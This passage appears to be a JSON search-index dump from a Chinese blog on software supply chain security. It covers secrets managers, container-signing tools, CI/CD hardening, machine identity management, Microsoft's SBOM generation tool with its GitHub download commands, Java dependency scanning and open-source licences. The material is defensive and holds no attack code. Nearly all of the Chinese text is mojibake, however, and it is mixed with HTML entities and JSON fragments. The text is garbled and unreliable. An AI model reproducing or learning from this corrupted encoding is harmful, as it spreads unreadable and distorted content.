Manager\n\n\nAzure Key Vault\n\n\n\nGCP Secret Manager\n\n\n\nå®¹å™¨åŸç”Ÿç¯å¢ƒ\nKubernetes Secrets (etcd)\n\n\nSealed Secrets\n\n\n\né…ç½®ç®¡ç†\nAnsible Vault\n\n\nChef Data Bag\n\n\n\nPuppet Hiera\n\n\n\n2. é€šè¿‡ç­¾åå’Œæ•£åˆ—å‡½æ•°æ¥éªŒè¯æºç çš„å®Œæ•´æ€§\nå“ˆå¸Œå’Œç­¾åå¯ç”¨äºéªŒè¯æºä»£ç å’ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„å®Œæ•´æ€§ã€‚VCSï¼ˆç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼‰åœ¨æäº¤æ—¶ä¼šå¯¹å•ä¸ªæ–‡ä»¶ç”Ÿæˆå“ˆå¸Œï¼Œè¯¥å“ˆå¸Œå¯ä»¥ç”¨äºéªŒè¯æ–‡ä»¶åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦è¢«ç¯¡æ”¹ã€‚å¦å¤–ï¼Œç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶ä¹Ÿç”Ÿæˆå“ˆå¸Œï¼Œå¯ä»¥é€šè¿‡å°†æäº¤æ—¶å’Œç¼–è¯‘æ—¶çš„å“ˆå¸Œè¿›è¡Œå¯¹æ¯”ï¼Œä»¥ä¿è¯ä»£ç åœ¨æäº¤é˜¶æ®µå’Œç¼–è¯‘é˜¶æ®µæœªè¢«ç¯¡æ”¹ã€‚\n\næäº¤ç­¾åç”±äºå“ˆå¸Œä¸èƒ½éªŒè¯æ¥æºï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡VCSçš„ç­¾åæäº¤åŠŸèƒ½æ¥éªŒè¯æäº¤ä»£ç äººçš„èº«ä»½ã€‚\n\nå®¹å™¨ç­¾åå½“å‰è¶Šæ¥è¶Šå¤šçš„ç³»ç»Ÿå¼€å§‹é€šè¿‡å®¹å™¨è¿›è¡Œéƒ¨ç½²ï¼Œå› æ­¤éœ€è¦ä¿è¯å®¹å™¨æœªè¢«ç¯¡æ”¹è¿‡ã€‚å³ä½¿ç”¨æˆ·çš„å…¬å¸æˆ–ç»„ç»‡è‡ªè¡Œæ„å»ºå’Œç»´æŠ¤å†…éƒ¨é•œåƒï¼ŒGartner ä¹Ÿå»ºè®®å¯¹å®¹å™¨é•œåƒè¿›è¡Œç­¾åã€‚è¿™æ˜¯å› ä¸ºç¬¬ä¸‰æ–¹ä»£ç æˆ–ä¾èµ–é¡¹ä¸­çš„ä»»ä½•é—®é¢˜éƒ½ä¼šå½±å“æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºçš„å®‰å…¨çŠ¶å†µ\n\nå®¹å™¨ç­¾åçš„å·¥å…·å¦‚ä¸‹ï¼š\n\n\n\n\n\nå·¥å…·åç§°\nä»‹ç»\nåœ°å€\n\n\n\nGrafeas\nGrafeaså®šä¹‰ç”¨äºç®¡ç†æœ‰å…³è½¯ä»¶èµ„æºçš„å…ƒæ•°æ®çš„APIæ ¼å¼ï¼Œä¾‹å¦‚å®¹å™¨é•œåƒï¼ŒVMé•œåƒï¼ŒJARåŒ…å’Œè„šæœ¬ï¼Œä¸ºæ„å»ºä»£ç åˆ°å®¹å™¨ä¾›åº”é“¾çš„ç»„ä»¶ï¼ŒåŒ…æ‹¬ç»„ä»¶çš„æ¥æºã€æ¼æ´ã€ä¾èµ–å…³ç³»ç­‰æä¾›äº†ä¸€ä¸ªé›†ä¸­çš„çŸ¥è¯†åº“ã€‚\nhttps://github.com/grafeas/grafeas\n\n\nKritis\nKritis æ˜¯ä¸€ä¸ªKuberneteså‡†å…¥æ§åˆ¶å™¨ï¼Œå®ƒåœ¨è¿è¡Œæ—¶è¿è¡Œç”±Kubernetesé›†ç¾¤ç®¡ç†å‘˜å®šä¹‰çš„ç­–ç•¥æ£€æŸ¥ï¼Œç„¶åæ ¹æ®é•œåƒä¸­çš„æ¼æ´æˆ–é•œåƒä¸æ˜¯ä»å¯ä¿¡æ¥æºè·å¾—çš„ï¼Œæ‰¹å‡†æˆ–æ‹’ç»è¦å¯åŠ¨çš„å®¹å™¨ã€‚\nhttps://github.com/grafeas/kritis\n\n\nKritis Singer\næ˜¯ä¸€ä¸ªä¸ºå®¹å™¨å›¾åƒåˆ›å»ºè®¤è¯çš„å‘½ä»¤è¡Œå·¥å…·ã€‚\nhttps://github.com/grafeas/kritis/blob/master/docs/signer.md\n\n\nCosign\nCosignå¯¹å®¹å™¨å›¾åƒç­¾åã€‚Cosignæ˜¯ç”±LinuxåŸºé‡‘ä¼šä¸»åŠçš„sigstoreé¡¹ç›®çš„ä¸€éƒ¨åˆ†ã€‚\nhttps://github.com/sigstore/cosign\n\n\n3. åœ¨CI&#x2F;CDç®¡é“ä¸­é…ç½®å®‰å…¨æ§åˆ¶æ”»å‡»è€…å¯ä»¥é€šè¿‡æ”»å‡»CI&#x2F;CDç³»ç»Ÿæ¥ç»•è¿‡å¯¹ä»£ç çš„æ£€æŸ¥å’Œæ‰«æï¼Œå› æ­¤éœ€è¦ä¿è¯CI&#x2F;CDç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚å¯ä»¥é€šè¿‡å¯¹CI&#x2F;CDç³»ç»Ÿçš„å®‰å…¨é…ç½®æ¥é˜²èŒƒé£é™©ã€‚å¸¸è§å·¥å…·ï¼šApiiro, Argon,Cycode, Garantir, GrammaTech, JFrog (Vdoo)ã€RunSafe Securityã€‚ä¿æŠ¤ CI&#x2F;CD ç®¡é“æœ‰ä»¥ä¸‹ä¸¤ç‚¹æªæ–½ï¼šÂ \n\nå¯å¤ç°çš„æ„å»ºè¿‡ç¨‹ç¡®ä¿ç›¸åŒçš„ä»£ç å§‹ç»ˆæ„å»ºç›¸åŒçš„è½¯ä»¶ï¼Œå…¶ä¸­åŒ…å«ä»¥ä¸‹ä¸‰ç‚¹åŸåˆ™ï¼šÂ \nç¡®å®šæ€§æ„å»ºï¼šç¡®ä¿ç›¸åŒçš„æºä»£ç å¿…é¡»ç¼–è¯‘æ„å»ºç›¸åŒçš„è½¯ä»¶å¼ºåŒ–æ„å»ºå·¥å…·ï¼šæ„å»ºç®¡é“ä¸­çš„å·¥å…·æ˜¯å®‰å…¨ç¨³å®šçš„ä¸”ä¸å¯æ›´æ”¹çš„å¯éªŒè¯è¾“å‡ºï¼šèƒ½å¤Ÿæ£€æµ‹å’ŒéªŒè¯é¢„æœŸæ„å»ºå’Œå®é™…æ„å»ºä¹‹é—´çš„å·®å¼‚Â \n\nåœ¨æ„å»ºç®¡é“ä¸­åˆ›å»ºä¸å¯å˜çš„ã€å¯éªŒè¯çš„åˆ¶å“ç­¾åä»»åŠ¡æ”¯æŒåœ¨ç®¡é“è¿è¡ŒæœŸé—´ç”Ÿæˆåˆ¶å“çš„ç­¾åï¼Œä»¥ç¡®ä¿ä¸€è‡´æ€§å¹¶åœ¨ç®¡é“æ‰§è¡Œç»“æŸæ—¶éªŒè¯å‡ºå¤„ã€‚\n\n\nå¯¹äºIDEçš„ä¿æŠ¤ï¼Œå¯ä»¥ä½¿ç”¨åŸºäºæµè§ˆå™¨çš„IDEï¼ˆè¿œç¨‹å¼€å‘æ¡Œé¢ï¼‰ï¼Œé˜²æ­¢å¼€å‘äººå‘˜æœ¬åœ°å®‰è£…çš„IDEå·¥å…·å­˜åœ¨é£é™©ã€‚\nç”Ÿäº§ç¯å¢ƒé£é™©åº”å¯¹æªæ–½æ“ä½œç¯å¢ƒé£é™©æ˜¯æŒ‡åœ¨æ•´ä¸ªè½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­æ‰€æ¶‰åŠçš„æ“ä½œç¯å¢ƒçš„é£é™©ï¼Œå¦‚å¼€å‘ç¯å¢ƒã€ä»£ç ä»“åº“ã€æµæ°´çº¿ç³»ç»Ÿã€æµ‹è¯•ç¯å¢ƒç­‰ã€‚é’ˆå¯¹æ“ä½œç¯å¢ƒçš„é£é™©é˜²èŒƒæªæ–½åŒ…æ‹¬ï¼š\t\n1. æœ€å°æƒé™è®¿é—®ç­–ç•¥ç½‘ç»œä¸Šè¿æ¥ç€ä¸åŒè®¾å¤‡ï¼Œç‰¹æƒæå‡å…è®¸æ”»å‡»è€…ä¸€æ—¦è·å¾—å¯¹ä¸€ä¸ªç³»ç»Ÿçš„è®¿é—®ï¼Œå°±å¯ä»¥æ¸—é€åˆ°å…¶ä»–æœºå™¨å’ŒæœåŠ¡ä¸­ã€‚æ­¤å¤–ï¼Œé™¤éå®æ–½äº†æ­£ç¡®çš„è®¿é—®æ§åˆ¶ï¼Œå¦åˆ™å—åˆ°æ”»å‡»çš„å¯æ‰§è¡Œæ–‡ä»¶å¯èƒ½ä¼šæœªç»æˆæƒä¸å…¶ä»–æ ¸å¿ƒç³»ç»Ÿå»ºç«‹è¿æ¥ã€‚å› æ­¤ï¼ŒGarterå»ºè®®ä½¿ç”¨åŸºäºè§’è‰²çš„èº«ä»½éªŒè¯å’Œæˆæƒã€ä½¿ç”¨é›¶ä¿¡ä»»å®‰å…¨æ¨¡å‹çš„è‡ªé€‚åº”è®¿é—®å’Œç‰¹æƒè®¿é—®ç®¡ç†ã€‚\n2. æœºå™¨èº«ä»½ç®¡ç†å¯¹åˆ†å¸ƒå¼åº”ç”¨ã€äº‘åŸç”Ÿã€APIæœåŠ¡ç­‰æ¶æ„ä½“ç³»çš„ä½¿ç”¨ä½¿å¾—åº”ç”¨ç³»ç»Ÿçš„éƒ¨ç½²å˜å¾—æ›´ç»†é¢—ç²’åº¦ä¸”æ•°é‡å¢å¤šã€‚æœºå™¨èº«ä»½ç®¡ç†æ˜¯å¯¹ä¸»æœºã€å®¹å™¨ã€è™šæ‹Ÿæœºã€åº”ç”¨ç¨‹åºã€æ•°æ®åº“ã€APIæœåŠ¡ç­‰æœºå™¨çš„èº«ä»½è¿›è¡Œç»Ÿä¸€ç®¡ç†ã€ç»Ÿä¸€éªŒè¯ï¼Œç¡®å®šæœºå™¨çš„å”¯ä¸€èº«ä»½ã€‚åŒ…æ‹¬ï¼šå¯†é’¥ç®¡ç†ã€è¯ä¹¦ç®¡ç†ç­‰ã€‚å¸¸è§çš„æœºå™¨èº«ä»½è¯†åˆ«ç³»ç»Ÿå¦‚ä¸‹ï¼š\n\n\n\nä½¿ç”¨åœºæ™¯\nä½œç”¨åŸŸ\nåº”ç”¨åç§°\n\n\n\né™æ€æ•°æ®åŠ å¯†ï¼Œå¯¹ç§°å¯†é’¥ç®¡ç†\nå¯†é’¥ç®¡ç†ç³»ç»Ÿ\nAkeyless\n\n\n\n\nAWS\n\n\n\n\nKMS\n\n\n\n\nAzure\n\n\n\n\nTwilio (Ionic)\n\n\n\n\nFortanix\n\n\n\n\nPKWARE\n\n\n\n\nThales and Townsend Security\n\n\nå­˜å‚¨DevOpsç®¡é“ä¸­ä½¿ç”¨çš„å¯†é’¥ï¼Œå°†æœºå™¨æ ‡è¯†å‘é€ç»™å®¹å™¨\næœºå¯†ç®¡ç†\nAkeyless\n\n\n\n\nAWS\n\n\n\n\nMicrosoft Azure\n\n\n\n\nBeyondTrust\n\n\n\n\nCyberArk\n\n\n\n\nFortanix\n\n\n\n\nGoogle Cloud Platform (GCP)\n\n\n\n\nHashiCorp\n\n\n\n\nThycoticCentrify\n\n\nç”¨äºä»£ç ç­¾åçš„èº«ä»½éªŒè¯ã€åŠ å¯†å’Œç­¾å\nPKIå’Œè¯ä¹¦ç®¡ç†\nAppViewX\n\n\n\n\nAWS\n\n\n\n\nDigiCert\n\n\n\n\nEntrust\n\n\n\n\nGlobalSign\n\n\n\n\nKeyfactor\n\n\n\n\nMicrosoft\n\n\n\n\nThe Nexus Group\n\n\n\n\nSectigo\n\n\n\n\nVenafi\n\n\nå‘ç°å’Œæ§åˆ¶å¯¹å…³é”®ç³»ç»Ÿçš„ç‰¹æƒè®¿é—®\nç‰¹æƒè®¿é—®ç®¡ç†\nAkeyless\n\n\n\n\nBeyondTrust\n\n\n\n\nBroadcom\n\n\n\n\nCyberArk\n\n\n\n\nOne Identity\n\n\n\n\nThycoticCentrify\n\n\n3. å¼‚å¸¸æ£€æµ‹å’Œè‡ªåŠ¨å“åº”è½¯ä»¶å·¥ç¨‹é¢†å¯¼è€…å¿…é¡»ä¸å®‰å…¨å’Œé£é™©å›¢é˜Ÿå¯†åˆ‡åˆä½œï¼Œä»¥äº†è§£å’Œå®šä¹‰å…¶å¼€å‘å¹³å°å’Œå·¥å…·çš„é¢„æœŸè¡Œä¸ºï¼Œä»¥ä¾¿ä»–ä»¬èƒ½å¤Ÿå®æ—¶æ£€æµ‹å¼‚å¸¸ã€‚ ä¾‹å¦‚ï¼ŒEDRã€CWPPã€NDR æˆ– squery ç­‰å·¥å…·å¯ä»¥ç›‘æ§ç³»ç»Ÿå¼‚å¸¸ã€‚ æ„å»ºç³»ç»Ÿï¼ŒåŒ…æ‹¬è½¯ä»¶å·¥ç¨‹å¸ˆä½¿ç”¨çš„ PCï¼Œä¸åº”å…é™¤ EPP&#x2F;EDR ä¿æŠ¤ã€‚å¼‚å¸¸æ£€æµ‹å’Œå“åº”åœ¨å®¹å™¨åŸç”Ÿã€åŸºäº GitOps çš„éƒ¨ç½²ä¸­å°¤å…¶é‡è¦ï¼Œå¯ä»¥è‡ªåŠ¨åŒ–éƒ¨ç½²å®Œæ•´çš„ä»£ç åˆ°å®¹å™¨å·¥ä½œæµç¨‹ã€‚ å°½ç®¡å¤„äºå¼€å‘é˜¶æ®µçš„å®¹å™¨é•œåƒæ‰«æå·¥å…·æœ‰åŠ©äºæ£€æµ‹å·²çŸ¥æ¼æ´ï¼Œä½†è½¯ä»¶å·¥ç¨‹å›¢é˜Ÿå¿…é¡»éƒ¨ç½²ç›¸å…³å·¥å…·æ¥å¯è§†åŒ–å®¹å™¨æµé‡ã€è¯†åˆ«é›†ç¾¤é”™è¯¯é…ç½®å¹¶å¯¹å¼‚å¸¸å®¹å™¨è¡Œä¸ºå’Œå®‰å…¨äº‹ä»¶è¿›è¡Œç›‘æµ‹ã€‚å¯¹å¼‚å¸¸æ´»åŠ¨è¿›è¡Œç›‘æµ‹ï¼Œå¹¶åŠæ—¶å“åº”å’Œå¤„ç†æœ‰ä»¥ä¸‹å››ç‚¹ï¼š\n\n\nå¯æ‰§è¡Œæ–‡ä»¶ä¸è®¿é—®æ§åˆ¶ç³»ç»Ÿåˆ›å»ºä¸å¿…è¦çš„è¿æ¥\n\n\n\nç‰¹å®šæœºå™¨ä¸Šçš„è¿›ç¨‹ã€çº¿ç¨‹ä»¥åŠCPUå’Œå†…å­˜çš„åˆ©ç”¨ç‡å¢åŠ \n\n\n\né’ˆå¯¹ç½‘ç»œè®¿é—®ã€å­˜å‚¨åº“çš„ä¸Šä¼ åŠä¸‹è½½ã€éå¸¸ç”¨ç›®å½•çš„æµè®¿é—®é‡æ¿€å¢\n\n\n\nç›‘æ§è½¯ä»¶çš„å¼‚å¸¸å‘Šè­¦ï¼ˆSIEMã€EPPã€CASBï¼‰\n\n\n\næ€»ç»“ä»SolarWinds (2020)ã€NetBeans IDE (2020)ã€Kaseya (2021) å’Œ Codecov (2021)æ”»å‡»æ¡ˆä¾‹æ¥çœ‹ï¼Œè½¯ä»¶ä¾›åº”é“¾å®‰å…¨æ”»å‡»èŒƒå›´è¾ƒå¹¿ï¼Œéš¾åº¦è¾ƒé«˜ï¼Œå‘¨æœŸè¾ƒé•¿ï¼Œå½±å“è¾ƒè¿œï¼Œé˜²æŠ¤è¾ƒå¼±ã€‚æ ¹æ®ä¿¡æ¯å®‰å…¨çš„â€œæœ¨æ¡¶ç†è®ºâ€ï¼šâ€œä¿¡æ¯çš„å®‰å…¨å°±åƒä¸€ä¸ªâ€˜æœ¨æ¡¶â€™ï¼Œæ•´ä½“çš„å®‰å…¨æ€§å–å†³äºæœ€è–„å¼±çš„ä¸€ä¸ªç¯èŠ‚ï¼Œå¦åˆ™å³ä½¿å…¶å®ƒæ–¹é¢åšå¾—å†å¼ºï¼Œä½†åœ¨æŸä¸€æ–¹é¢ç•™ä¸‹ä¸€ä¸ªæ¼æ´ï¼Œä¹Ÿå¯èƒ½è¢«ä»–äººåˆ©ç”¨ï¼Œå¯¼è‡´ä¿¡æ¯çš„å¤±çªƒã€‚â€ä¾›åº”é“¾å½“å‰å®‰å…¨ç°çŠ¶ä¹Ÿå¦‚æ­¤ã€‚ä¸ºäº†æå‡è½¯ä»¶ä¾›åº”é“¾å®‰å…¨ï¼Œå»ºè®®è½¯ä»¶å·¥ç¨‹å›¢é˜Ÿæ ¹æ®è‡ªèº«æƒ…å†µï¼Œå¾ªåºæ¸è¿›æå‡è½¯ä»¶ä¾›åº”é“¾å®‰å…¨èƒ½åŠ›ã€‚\nReferences\nhttps://www.gartner.com/en/documents/4003625ã€How Software Engineering Leaders Can Mitigate Software Supply Chain Security Risksã€‘\nhttps://cloud.tencent.com/developer/article/1839537ã€ä¼ä¸šçº§é™æ€ä»£ç åˆ†æå·¥å…·æ¸…å•ã€‘\nhttps://www.gartner.com/reviews/market/software-composition-analysis-scaã€Products In Software Composition Analysis (SCA) reviews Marketã€‘\nhttps://sudonull.com/post/27911-Forrester-Research-A-Comparison-of-Ten-Top-Software-Composition-Analysis-Vendorsã€Forrester Research: A Comparison of Ten Top Software Composition Analysis Vendorsã€‘\nhttps://blog.csdn.net/m0_50579386&#x2F;article&#x2F;details&#x2F;123507873ã€å›½å†…å¤–è½¯ä»¶æˆåˆ†åˆ†æSCAäº§å“è¯„æµ‹ã€‘\nhttps://developer.aliyun.com/article/738408ã€Kubernetes æ—¶ä»£çš„å®‰å…¨è½¯ä»¶ä¾›åº”é“¾ã€‘\n\n","slug":"Gartner-ã€Šè½¯ä»¶å·¥ç¨‹é¢†å¯¼è€…å¦‚ä½•é™ä½è½¯ä»¶ä¾›åº”é“¾é£é™©ã€‹åˆ†äº«","date":"2022-07-25T05:18:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"è½¯ä»¶ä¾›åº”é“¾é£é™©,ä¼˜ç§€æ–‡ç« æ”¶è—","author_index":"Moses"},{"id":"67dd0e8e72f6ddd8ae2e7ba7f339b055","title":"è½¯ä»¶ææ–™æ¸…å•ç”Ÿæˆå·¥å…·-å¾®è½¯","content":"å¾®è½¯å¼€æºå…¶è½¯ä»¶ææ–™æ¸…å•ï¼ˆSBOMï¼‰ç”Ÿæˆå·¥å…·0x01ç®€ä»‹2022å¹´7æœˆ12æ—¥å¾®è½¯å¼€æºäº†åŸä»¶ææ–™æ¸…å•ç”Ÿæˆå·¥å…·ï¼Œè¯¥å·¥å…·é€‚ç”¨äºWindowsã€Linuxå’ŒMacç­‰è·¨å¹³å°ï¼Œå¹¶ä½¿ç”¨æ ‡å‡†è½¯ä»¶åŒ…æ•°æ®äº¤æ¢ï¼ˆSPDXï¼‰æ ¼å¼ã€‚ï¼ˆè¦æŸ¥çœ‹ä¹‹å‰å…³äºæˆ‘ä»¬SBOMå·¥å…·çš„å…¬å‘Šï¼Œè¯·é˜…è¯»å¾®è½¯ä½¿ç”¨SPDXç”Ÿæˆè½¯ä»¶ææ–™æ¸…å•ï¼ˆSBOMï¼‰ã€‚ï¼‰\nå¾ˆå®¹æ˜“åœ°é›†æˆåˆ°å¹¶è‡ªåŠ¨æ£€æµ‹NPMã€NuGetã€PyPIã€CocoaPodsã€Mavenã€Golangã€Rust Cratesã€RubyGemsã€å®¹å™¨ä¸­çš„Linuxè½¯ä»¶åŒ…ã€Gradleã€Ivyã€GitHubå…¬å…±å­˜å‚¨åº“ç­‰ã€‚éšç€æˆ‘ä»¬åœ¨ç»„ä»¶æ£€æµ‹ä¸­æ·»åŠ æ›´å¤šæ£€æµ‹å™¨ï¼Œå®ƒä¹Ÿå°†æ”¹è¿›æˆ‘ä»¬çš„SBOMå·¥å…·ã€‚\n0x02SPDXè§„èŒƒSBOMåŒ…å«åŸºäºSPDXè§„èŒƒçš„å››ä¸ªä¸»è¦éƒ¨åˆ†ï¼š\n\næ–‡æ¡£åˆ›å»ºä¿¡æ¯ï¼šæœ‰å…³SBOMæ–‡æ¡£çš„ä¸€èˆ¬ä¿¡æ¯ï¼Œä¾‹å¦‚è½¯ä»¶åç§°ã€SPDXè®¸å¯è¯ã€SPDXç‰ˆæœ¬ã€åˆ›å»ºæ–‡æ¡£çš„äººã€åˆ›å»ºæ—¶é—´ç­‰ã€‚\næ–‡ä»¶éƒ¨åˆ†ï¼šæ„æˆè½¯ä»¶çš„æ–‡ä»¶åˆ—è¡¨ã€‚æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€äº›å±æ€§ï¼ŒåŒ…æ‹¬å…¶å†…å®¹çš„æ•£åˆ—ï¼ˆSHA-1ã€SHA-256ï¼‰ã€‚\nè½¯ä»¶åŒ…éƒ¨åˆ†ï¼šæ„å»ºè½¯ä»¶æ—¶ä½¿ç”¨çš„è½¯ä»¶åŒ…åˆ—è¡¨ã€‚æ¯ä¸ªè½¯ä»¶åŒ…éƒ½æœ‰å…¶ä»–å±æ€§ï¼Œå¦‚åç§°ã€ç‰ˆæœ¬ã€ä¾›åº”å•†ã€æ•£åˆ—ï¼ˆSHA-1ã€SHA-256ï¼‰å’Œè½¯ä»¶åŒ…URLï¼ˆç´«è‰²ï¼‰è½¯ä»¶æ ‡è¯†ç¬¦ã€‚\nå…³ç³»éƒ¨åˆ†ï¼šSBOMä¸åŒå…ƒç´ ï¼ˆå¦‚æ–‡ä»¶å’Œè½¯ä»¶åŒ…ï¼‰ä¹‹é—´çš„å…³ç³»åˆ—è¡¨ã€‚\n\nå®ƒè¿˜å¯ä»¥å‚è€ƒå…¶ä»–SBOMæ–‡æ¡£æ¥æ•è·å®Œæ•´çš„ä¾èµ–æ ‘ã€‚è¿™æ˜¯åŒ…å«SBOMæ–‡æ¡£çš„ä¾èµ–å¼•ç”¨çš„é‡è¦åŠŸèƒ½ï¼Œæˆ–ç”¨äºåç»­æ„å»ºçš„å‰èº«æ„å»ºçš„SBOMæ–‡æ¡£ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ç”±æ­¤äº§ç”Ÿçš„SBOMæ–‡æ¡£å¼•ç”¨è¢«æ·»åŠ åˆ°_æ–‡æ¡£åˆ›å»ºä¿¡æ¯_éƒ¨åˆ†ï¼Œç¤ºä¾‹å¦‚ä¸‹æ‰€ç¤ºã€‚\n&quot;externalDocumentRefs&quot;: [\n\n&#123;\n\n&quot;externalDocumentId&quot;: &quot;DocumentRef-Demo-861-71558f43fca51a285338834fb9b3c7c14a78cd77&quot;,\n\n&quot;spdxDocument&quot;: &quot;https:&#x2F;&#x2F;sbom.microsoft&#x2F;1:VF6zo7ndBEakT2mCbPwGug:j5h1PLm-TkijVnfDJD_CCA&#x2F;7:861&#x2F;MMerAxYfQkOTN4dWqqlV-A&quot;,\n\n&quot;checksum&quot;: &#123;\n\n&quot;ç®—æ³•&quot;: &quot;SHA1&quot;,\n\næ ¡éªŒå’Œå€¼ï¼š71558f43fca51a285338834fb9b3c7c14a78cd77â€œ&#125;&#125;ï¼Œ\n0x03ä¸‹è½½å®‰è£…\nLinuxcurl -Lo sbom-tool https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;sbom-tool&#x2F;releases&#x2F;latest&#x2F;download&#x2F;sbom-tool-linux-x64\nchmod +x sbom-tool\nwindowsInvoke-WebRequest -Uri &quot;https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;sbom-tool&#x2F;releases&#x2F;latest&#x2F;download&#x2F;sbom-tool-win-x64.exe&quot; -OutFile &quot;sbom-tool.exe&quot;\nmacoscurl -Lo sbom-tool https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;sbom-tool&#x2F;releases&#x2F;latest&#x2F;download&#x2F;sbom-tool-osx-x64\nchmod +x sbom-tool\n\n0x04Usagegenerate -b &lt;drop path&gt; -bc &lt;build components path&gt; -pn &lt;package name&gt; -pv &lt;package version&gt; -nsb &lt;namespace uri base&gt;\nè¯¦ç»†å‚æ•°sbom-tool&#x2F;sbom-tool-arguments.md at main Â· microsoft&#x2F;sbom-tool Â· GitHub\nReferencesClause 6: Document Creation Information - specification v2.2.2Microsoft open sources its software bill of materials (SBOM) generation tool - Engineering@Microsoft\n","slug":"å¾®è½¯å¼€æºå…¶è½¯ä»¶ææ–™æ¸…å•ï¼ˆSBOMï¼‰ç”Ÿæˆå·¥å…·","date":"2022-07-22T01:14:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SBOM,å·¥å…·","author_index":"Moses"},{"id":"b7081b396c4538900c4bf192cfa3bd50","title":"Javaä¾›åº”é“¾ï¼ˆä¾èµ–ï¼‰å®‰å…¨æ£€æµ‹å®è·µ","content":"â˜ï¸ç®€ä»‹ç•¥-è§é“¾æ¥\nğŸ”—é“¾æ¥\nJava ä¾›åº”é“¾(ä¾èµ–)å®‰å…¨æ£€æµ‹å®è·µ\nè½¯ä»¶æˆåˆ†å®‰å…¨åˆ†æï¼ˆSCAï¼‰èƒ½åŠ›çš„å»ºè®¾ä¸æ¼”è¿›\n\nğŸ¤”æ„Ÿæ‚Ÿ\nåœ¨ SDL æµç¨‹ä¸­ï¼Œé€šè¿‡æ¶ˆæ¯æ¥è°ƒåº¦å„å®‰å…¨èƒ½åŠ›ï¼Œä¸Šå›¾ä»¥æ•°å­—ç¼–å·æè¿°äº†æ„å»ºé˜¶æ®µçš„å¢é‡æ‰«ææµç¨‹å’ŒåŒ…å«äº† SCA è¾…åŠ© SAST åˆ¤æ–­ä¾èµ–æ¼æ´å¯åˆ©ç”¨æ€§çš„ SAST æ‰«ææµç¨‹ï¼Œä»¥å­—æ¯ç¼–å·æè¿°äº†è¿è¡Œé˜¶æ®µçš„å­˜é‡æ‰«ææµç¨‹ã€‚æ„å»ºé˜¶æ®µï¼ŒSCA æ‰«æç”±å·¥ç¨‹æ„å»ºå®Œæˆæ¶ˆæ¯è§¦å‘ï¼Œæ•°æ®æµ mavenTree çš„è¾“å…¥ç”± SCA ä» SDL è·å–ï¼Œå®Œæˆæ‰«æåè¿”å›æ¼æ´ä¿¡æ¯ç»™ SDLï¼ŒSCA çš„å¯åˆ©ç”¨æ€§æ£€æŸ¥èƒ½åŠ›é€šè¿‡å’Œ SAST ä¹‹é—´è‡ªå»ºçš„æ¶ˆæ¯é˜Ÿåˆ—å¼‚æ­¥æä¾›ç»™ SASTã€‚è¿è¡Œé˜¶æ®µï¼ŒSCA æ‰«æç”±èµ„äº§åº“æ›´æ–°çš„æ¶ˆæ¯è§¦å‘ï¼ŒSCA ä»èµ„äº§åº“æŸ¥è¯¢ Jar åŒ…çš„ maven åæ ‡æ£€æµ‹æ¼æ´ï¼Œæ£€æµ‹ä¹‹åè¾“å‡ºç»™ SDLã€‚\nğŸˆè¡ŒåŠ¨ç•¥\n","slug":"Java ä¾›åº”é“¾(ä¾èµ–)å®‰å…¨æ£€æµ‹å®è·µ","date":"2022-07-12T09:50:01.631Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"ä¼˜ç§€æ–‡ç« æ”¶è—,SCA,JAVA","author_index":"Moses"},{"id":"bcfb0bc31886c6fac8f776ffee8c1943","title":"å¼€æºè½¯ä»¶æ²»ç†-å¼€æºè½¯ä»¶å¼•å…¥é£é™©åŠç®¡æ§ä¸¾æª","content":"â˜ï¸ç®€ä»‹è§é“¾æ¥\nğŸ”—é“¾æ¥æµ…è°ˆæ•æ·å¼€å‘æ¨¡å¼ä¸‹é“¶è¡Œä¸šé‡‘èæœºæ„å¼€æºè½¯ä»¶å¼•å…¥é£é™©åŠç®¡æ§ä¸¾æª â€“ å®‰å…¨æ‘SPDX License List | Software Package Data Exchange (SPDX)\nğŸ¤”æ„Ÿæ‚Ÿ\n\nğŸˆè¡ŒåŠ¨å¼€æºè®¸å¯è¯Apache\nApacheè®¸å¯è¯(Apache License)ï¼Œæ˜¯ä¸€ä¸ªåœ¨Apacheè½¯ä»¶åŸºé‡‘ä¼šå‘å¸ƒçš„è‡ªç”±è½¯ä»¶è®¸å¯è¯ï¼Œæœ€åˆä¸ºApache httpæœåŠ¡å™¨è€Œæ’°å†™ã€‚Apacheè®¸å¯è¯è¦æ±‚è¢«æˆæƒè€…ä¿ç•™ç‰ˆæƒå’Œæ”¾å¼ƒæƒåˆ©çš„ç”³æ˜ï¼Œä½†å®ƒä¸æ˜¯ä¸€ä¸ªåç‰ˆæƒçš„è®¸å¯è¯ã€‚\nå½“å‰ç‰ˆæœ¬Â Apache License, Version 2.0\n\nMIT\nMITè®¸å¯è¯ä¹‹åæºè‡ªéº»çœç†å·¥å­¦é™¢ï¼ˆMassachusetts Institute of Technology, MITï¼‰ï¼Œåˆç§°â€œXæ¡æ¬¾â€ï¼ˆX Licenseï¼‰æˆ–â€œX11æ¡æ¬¾â€ï¼ˆX11 Licenseï¼‰ã€‚\nMITæ˜¯å’ŒBSDä¸€æ ·å®½èŒƒçš„è®¸å¯åè®®ï¼Œä½œè€…åªæƒ³ä¿ç•™ç‰ˆæƒ,è€Œæ— ä»»ä½•å…¶ä»–äº†é™åˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ å¿…é¡»åœ¨ä½ çš„å‘è¡Œç‰ˆé‡ŒåŒ…å«åŸè®¸å¯åè®®çš„å£°æ˜ï¼Œæ— è®ºä½ æ˜¯ä»¥äºŒè¿›åˆ¶å‘å¸ƒçš„è¿˜æ˜¯ä»¥æºä»£ç å‘å¸ƒçš„ã€‚\nå½“å‰ç‰ˆæœ¬Â 